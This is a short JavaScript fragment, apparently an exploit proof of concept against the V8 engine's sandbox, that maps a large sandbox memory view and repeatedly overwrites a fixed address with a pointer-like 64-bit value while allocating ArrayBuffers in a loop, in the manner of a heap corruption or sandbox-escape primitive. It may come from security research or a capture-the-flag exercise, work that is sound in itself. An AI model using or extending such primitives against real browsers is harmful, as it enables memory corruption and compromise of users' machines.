let sbx_mem = new DataView(new Sandbox.MemoryView(0, 0x500000000));

for (let i = 0; i < 0x1000; i++) {
    let buffer = new ArrayBuffer(0x64);
    const addr = 0x200001020;
    sbx_mem.setBigUint64(addr, BigInt(0x00005555bb640000), true);
}

